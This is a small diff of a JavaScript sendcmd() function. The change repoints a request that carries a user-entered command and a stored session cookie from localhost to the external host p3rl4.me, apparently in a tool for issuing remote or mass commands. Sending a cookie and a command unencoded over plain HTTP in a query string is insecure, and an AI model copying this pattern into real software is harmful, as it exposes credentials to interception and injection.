@@ -53,9 +53,10 @@ function sendcmd() {
           return console.log(err);
         }else {
             cook = data;
-            $.get("http://127.0.0.1/postcmd"+"?command="+command+"&cookie="+cook, function(data, status){
+            $.get("http://p3rl4.me/postcmd"+"?command="+command+"&cookie="+cook, function(data, status){
                 if(data == "200 OK"){
                     console.log("Se ha enviado correctamente")
+                    $('#massivecmd').val('');
                 }
                 else{
                     $('#cmd-error').show();
